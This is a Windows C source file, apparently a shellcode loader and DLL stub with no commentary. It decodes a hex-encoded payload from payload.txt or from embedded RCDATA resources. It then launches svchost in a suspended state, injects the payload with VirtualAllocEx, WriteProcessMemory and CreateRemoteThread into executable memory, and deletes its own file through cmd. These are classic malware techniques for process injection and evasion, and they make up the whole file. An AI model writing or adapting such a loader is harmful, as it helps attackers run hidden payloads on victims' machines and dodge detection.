#include <io.h>
#include <stdio.h>
#include <process.h>
#include <windows.h>

static HINSTANCE DllHinst;

static char *convert(int *rawSize, const char *text) {
  int textSize = strlen(text);
  *rawSize = textSize / 2;
  char *raw = malloc(*rawSize);

  for (int i = 0; i < textSize; i += 2) {
    sscanf(text + i, "%2x", (int *)&raw[i / 2]);
  }

  return raw;
}

static char *readFile(int *rawSize) {
  FILE *file = fopen("payload.txt", "rb");

  fseek(file, 0, SEEK_END);
  int len = ftell(file);
  rewind(file);

  char *text = malloc(len + 1);
  fread(text, sizeof(char), len, file);
  text[len] = 0;
  fclose(file);

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

static char *readResource(int *rawSize) {
  char *text = NULL;
  for (int i = 0, len = 0; i < 50; i++) {
    char *res = LoadResource(DllHinst, FindResource(DllHinst, MAKEINTRESOURCE(i), RT_RCDATA));
    len += strlen(res);
    text = realloc(text, len + 1);
    text[len] = 0;

    if (i == 0) {
      strcpy(text, res);
    } else {
      strcat(text, res);
    }
  }

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

int main() {
  int rawSize;
  char *raw;

  if (access("payload.txt", F_OK) == 0) {
    raw = readFile(&rawSize);
  } else {
    raw = readResource(&rawSize);
  }

  STARTUPINFO si = {0};
  PROCESS_INFORMATION pi = {0};
  CreateProcess(0, "svchost", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

  void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
  CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);

  free(raw);

  char args[MAX_PATH], path[MAX_PATH];
  GetModuleFileName(DllHinst, path, MAX_PATH);
  sprintf(args, "/c del \"%s\"", path);
  spawnlp(P_OVERLAY, "cmd", args, NULL);

  return 0;
}

int msg() {
  puts("stub");
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
  switch (reason) {
  case DLL_PROCESS_ATTACH:
    DllHinst = hinst;
    break;
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

/*
  wchar_t *wstr;
  int size = LoadStringW(0, 123, (wchar_t *)&wstr, 0); // STRINGTABLE
  printf("%ls\n", wstr);

  // 宽字节 -> 多字节
  char *str = malloc(size + 1);
  wcstombs(str, wstr, size);
  str[size] = 0;
  printf("%s\n", str);
  free(str);

  // 多字节 -> 宽字节
  char *str = getcwd(0, 0);
  int size = mbstowcs(0, str, 0) + 1;
  wchar_t *wstr = malloc(size * sizeof(wchar_t));
  mbstowcs(wstr, str, size);
*/

/*
https://git.musl-libc.org/cgit/musl/tree/src/string/strcmp.c
*/
